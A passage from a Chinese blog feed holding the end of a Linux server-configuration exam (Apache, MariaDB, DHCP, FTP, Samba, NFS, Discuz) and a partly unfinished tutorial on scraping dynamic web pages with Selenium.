（15分）</p></li><li><p>1)安装Apache服务器</p></li><li><p>2)启动Apache服务器，并设置为永久启动</p></li><li><p>3)复制Web1的内容到/var/www/web1，/var/www/web1port8080下</p></li><li><p>4)复制Web2的内容到/var/www/web2，/var/www/web1port8080下</p></li><li><p>5)配置站点<a href="http://web1.jsjnet.com和http//web2.jsjnet.com">http://web1.jsjnet.com和http://web2.jsjnet.com</a></p></li><li><p>6)配置站点<a href="http://web1.jsjnet.com:8080和http://web2.jsjnet.com:8080">http://web1.jsjnet.com:8080和http://web2.jsjnet.com:8080</a></p><p>截图要求（安装启动过程，在本机上访问四个网址）：</p></li><li><p>（5）Mysql（10分）= mariadb  </p></li><li><p>1）安装mysql服务器和客户端</p></li><li><p>2）配置root数据库管理员密码为123456</p></li><li><p>3）创建新数据库exam，创建新用户user1，使新用户user1对于数据库具有所有权限。</p></li><li><p>mysql_secure_installation</p></li><li><p>mysql -u root -p</p></li><li><p>create database exam;</p></li><li><p>CREATE USER user1 IDENTIFIED BY ‘123456’;</p></li><li><p>GRANT ALL ON exam.* TO ‘user1’@’localhost’ IDENTIFIED BY WITH GRANT OPTION;</p></li><li><p>flush privileges;</p></li><li><p>use exam;</p></li><li><p>create table course(id int(4),cname char(20));</p></li><li><p>insert into exam.course values (1, ‘Linux’);</p></li><li><p>4）建立数据表course，name和score表结构如下：</p></li><li><p>course</p></li><li><p>id     cname</p></li><li><p>1      Linux</p></li><li><p>2      Windows</p></li><li><p>3      PHP</p></li><li><p>name</p></li><li><p>id     name</p></li><li><p>1      pig</p></li><li><p>2      duck</p></li><li><p>3      monkey</p></li><li><p>score</p></li><li><p>id     cname    name    score</p></li><li><p>1      Linux    pig       90</p></li><li><p>2      Linux    duck      90</p></li><li><p>3      Linux    monkey    90</p></li><li><p>4      windows  pig       90</p></li><li><p>5      windows  duck      90</p></li><li><p>截图查询数据库，表信息，并验证权限的信息；截图备份所有数据到backup文件的信息。</p></li><li><p>备份数据库</p></li><li><p>恢复数据库</p></li><li><p>检查恢复情况</p><h1 id="（6）配置DHCP服务（10分）"><a href="#（6）配置DHCP服务（10分）" class="headerlink" title="（6）配置DHCP服务（10分）"></a>（6）配置DHCP服务（10分）</h1></li><li><p>1)为虚拟机添加一块网卡使用仅主机连接，重启计算机，为计算机配置网卡为，IP地址为192.X.XX.10</p></li><li><p>2)配置一个DHCP服务器，地址池为192.X.XX.100-192.X.XX.200，网关为192.X.XX.254，DNS为192.X.XX.10</p></li><li><p>3)编辑/etc/sysctl.conf文件，确定里面有net.ipv4.ip_forward=1,执行sysctl -p</p></li><li><p>4)使用Windows系统中的Vmware NAT 网卡自动获取正确的IP地址<br>截图获取地址的信息图片，在WindowsDHCP客户端中访问以上Web题目中访问配置的几个域名网站的截图。</p></li><li><p>（7）配置文件共享服务（10分）</p></li><li><p>1）配置一个vsftpd服务，把/etc/hosts文件复制到/var/ftp/目录下，使客户端可以下载并查看该文件。</p></li><li><p>2）配置一个Samba服务，将/home/database文件夹共享给Z用户，密码为redhat，共享名为database，使Windows可以访问并上传文件</p></li><li><p>3）配置一个NFS服务，将/nfs/share1和/nfs/share2文件夹共享给客户端，使客户端可以挂载两个文件夹，实现对share2文件夹的读写功能。</p></li><li><p>截图要求：网页打开ftp共享的文件内容截图，windows查看文件共享并建立一个test 文件截图，NFS客户端df查看，挂载后写入文件查看截图。</p><p>#附加题（10分）：</p></li><li><p>（8）通过以上所有服务器的基本配置后，升级网站系统，将Discuz3.3的论坛系统，部署到LAMP架构下，并能够访问主站。<br>截图要求：访问<a href="http://bbs.jsjnet.com网站查看论坛截图,并正确登陆后台进行截图./">http://bbs.jsjnet.com网站查看论坛截图，并正确登陆后台进行截图。</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="linun" scheme="http://www.xiaocaibi.top/tags/linun/"/>
    
  </entry>
  
  <entry>
    <title>65.解析动态内容</title>
    <link href="http://www.xiaocaibi.top/posts/d0573169.html"/>
    <id>http://www.xiaocaibi.top/posts/d0573169.html</id>
    <published>2021-06-27T06:39:00.000Z</published>
    <updated>2021-09-20T08:47:43.775Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="解析动态内容"><a href="#解析动态内容" class="headerlink" title="解析动态内容"></a>解析动态内容</h2><p>根据权威机构发布的全球互联网可访问性审计报告，全球约有四分之三的网站其内容或部分内容是通过JavaScript动态生成的，这就意味着在浏览器窗口中“查看网页源代码”时无法在HTML代码中找到这些内容，也就是说我们之前用的抓取数据的方式无法正常运转了。解决这样的问题基本上有两种方案，一是JavaScript逆向工程；另一种是渲染JavaScript获得渲染后的内容。</p><h3 id="JavaScript逆向工程"><a href="#JavaScript逆向工程" class="headerlink" title="JavaScript逆向工程"></a>JavaScript逆向工程</h3><p>下面我们以“360图片”网站为例，说明什么是JavaScript逆向工程。其实所谓的JavaScript逆向工程就是找到通过Ajax技术动态获取数据的接口。在浏览器中输入<a href="http://image.so.com/z?ch=beauty">http://image.so.com/z?ch=beauty</a>就可以打开“360图片”的“美女”版块，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="./res/image360-website.png"></p><p>但是当我们在浏览器中通过右键菜单“显示网页源代码”的时候，居然惊奇的发现页面的HTML代码中连一个<code>&lt;img&gt;</code>标签都没有，那么我们看到的图片是怎么显示出来的呢？原来所有的图片都是通过JavaScript动态加载的，而在浏览器的“开发人员工具”的“网络”中可以找到获取这些图片数据的网络API接口，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="./res/api-image360.png"></p><p>那么结论就很简单了，只要我们找到了这些网络API接口，那么就能通过这些接口获取到数据，当然实际开发的时候可能还要对这些接口的参数以及接口返回的数据进行分析，了解每个参数的意义以及返回的JSON数据的格式，这样才能在我们的爬虫中使用这些数据。</p><h3 id="使用Selenium"><a href="#使用Selenium" class="headerlink" title="使用Selenium"></a>使用Selenium</h3><p>尽管很多网站对自己的网络API接口进行了保护，增加了获取数据的难度，但是只要经过足够的努力，绝大多数还是可以被逆向工程的，但是在实际开发中，我们可以通过浏览器渲染引擎来避免这些繁琐的工作，WebKit就是一个利用的渲染引擎。</p><p>WebKit的代码始于1998年的KHTML项目，当时它是Konqueror浏览器的渲染引擎。2001年，苹果公司从这个项目的代码中衍生出了WebKit并应用于Safari浏览器，早期的Chrome浏览器也使用了该内核。在Python中，我们可以通过Qt框架获得WebKit引擎并使用它来渲染页面获得动态内容，关于这个内容请大家自行阅读<a href="http://python.jobbole.com/84600/">《爬虫技术:动态页面抓取超级指南》</a>一文。</p><p>如果没有打算用上面所说的方式来渲染页面并获得动态内容，其实还有一种替代方案就是使用自动化测试工具Selenium，它提供了浏览器自动化的API接口，这样就可以通过操控浏览器来获取动态内容。首先可以使用pip来安装Selenium。</p><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">pip3 install selenium<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面以“阿里V任务”的“直播服务”为例，来演示如何使用Selenium获取到动态内容并抓取主播图片。</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import requestsfrom bs4 import BeautifulSoupdef main():    resp = requests.get('https://v.taobao.com/v/content/live?catetype=704&amp;from=taonvlang')    soup = BeautifulSoup(resp.text, 'lxml')    for img_tag in soup.select('img[src]'):        print(img_tag.attrs['src'])if __name__ == '__main__':    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行上面的程序会发现没有任何的输出，因为页面的HTML代码上根本找不到<code>&lt;img&gt;</code>标签。接下来我们使用Selenium来获取到页面上的动态内容，再提取主播图片。</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from bs4 import BeautifulSoupfrom selenium import webdriverfrom selenium.webdriver.common.keys import Keysdef main():    driver = webdriver.Chrome()    driver.get('https://v.taobao.com/v/content/live?catetype=704&amp;from=taonvlang')    soup = BeautifulSoup(driver.page_source, 'lxml')    for img_tag in soup.body.select('img[src]'):        print(img_tag.attrs['src'])if __name__ == '__main__':    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面的程序中，我们通过Selenium实现对Chrome浏览器的操控，如果要操控其他的浏览器，可以创对应的浏览器对象，例如Firefox、IE等。运行上面的程序，如果看到如下所示的错误提示，那是说明我们还没有将Chrome浏览器的驱动添加到PATH环境变量中，也没有在程序中指定Chrome浏览器驱动所在的位置。</p><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">selenium.common.exceptions.WebDriverException: Message: 'chromedriver' executable needs to be in PATH. Please see https://sites.google.com/a/chromium.org/chromedriver/home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了解决上面的问题，可以到Selenium的<a href="https://www.seleniumhq.org/">官方网站</a>找到浏览器驱动的下载链接并下载需要的驱动，在Linux或macOS系统下可以通过下面的命令来设置PATH环境变量，Windows下配置环境变量也非常简单，不清楚的可以自行了解。</p><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">export PATH=$PATH:/Users/Hao/Downloads/Tools/chromedriver/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中<code>/Users/Hao/Downloads/Tools/chromedriver/ </code>就是chromedriver所在的路径。当然，更为简单的办法是把chromedriver直接放在虚拟环境中，跟Python解释器位于同一个路径下就可以了。</p><h3 id="WebDriver用法详解"><a href="#WebDriver用法详解" class="headerlink" title="WebDriver用法详解"></a>WebDriver用法详解</h3><p>表1. 定位页面元素的方法</p><p>表2. WebDriver的常用属性</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>current_url</td><td>当前页面的URL</td></tr><tr><td>current_window_handle</td><td>当前窗口的句柄（引用）</td></tr><tr><td>name</td><td>WebDriver实例底层浏览器的名称</td></tr><tr><td>orientation</td><td>当前设备的方向（横屏、竖屏）</td></tr><tr><td>page_source</td><td>当前页面的源代码（动态内容）</td></tr><tr><td>title</td><td>当前页面的标题</td></tr><tr><td>window_handles</td><td>WebDriver打开的所有窗口的句柄</td></tr></tbody></table><p>表3. WebDriver的常用方法</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>back() / forward()</td><td>在浏览历史记录中后退/前进</td></tr><tr><td>close() / quit()</td><td>关闭当前浏览器窗口 / 退出WebDriver实例</td></tr><tr><td>get(url)</td><td>加载指定URL的页面到浏览器中</td></tr><tr><td>maximize_window()</td><td>将浏览器窗口最大化</td></tr><tr><td>refresh()</td><td>刷新当前页面</td></tr><tr><td>switch_to_active_element()</td><td>获得页面上得到焦点的元素</td></tr><tr><td>switch_to_alert()</td><td>把焦点切换至弹出的警告框</td></tr><tr><td>set_page_load_timeout(time_to_wait)</td><td>设置页面加载超时时间</td></tr><tr><td>set_script_timeout(time_to_wait)</td><td>设置JavaScript执行超时时间</td></tr><tr><td>implicit_wait(time_to_wait)</td><td>设置等待元素被找到或目标指令完成</td></tr></tbody></table><h3 id="WebElement用法"><a href="#WebElement用法" class="headerlink" title="WebElement用法"></a>WebElement用法</h3><p>表1. WebElement常用属性</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><p>表2. WebElement常用方法</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="Select用法"><a href="#Select用法" class="headerlink" title="Select用法"></a>Select用法</h3><h3 id="Alert用法"><a href="#Alert用法" class="headerlink" title="Alert用法"></a>Alert用法</h3><h3 id="元素等待机制"><a href="#元素等待机制" class="headerlink" title="元素等待机制"></a>元素等待机制</h3><h4 id="隐式等待"><a href="#隐式等待" class="headerlink" title="隐式等待"></a>隐式等待</h4><h4 id="显示等待"><a href="#显示等待" class="headerlink" title="显示等待"></a>显示等待</h4><h3 id="高级特性"><a href="#高级特性" class="headerlink" title="高级特性"></a>高级特性</h3><h4 id="鼠标和键盘事件"><a href="#鼠标和键盘事件" class="headerlink" title="鼠标和键盘事件"></a>鼠标和键盘事件</h4><h4 id="调用JavaScript"><a href="#调用JavaScript" class="headerlink" title="调用JavaScript"></a>调用JavaScript</h4><h4 id="屏幕截图和录制"><a href="#屏幕截图和录制" class="headerlink" title="屏幕截图和录制"></a>屏幕截图和录制</h4><h4 id="操作Cookie"><a href="#操作Cookie" class="headerlink" title="操作Cookie"></a>操作Cookie</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="解析动态内容" scheme="http://www.xiaocaibi.top/tags/%E8%A7%A3%E6%9E%90%E5%8A%A8%E6%80%81%E5%86%85%E5%AE%B9/"/>
    
  </entry>
  
</feed>
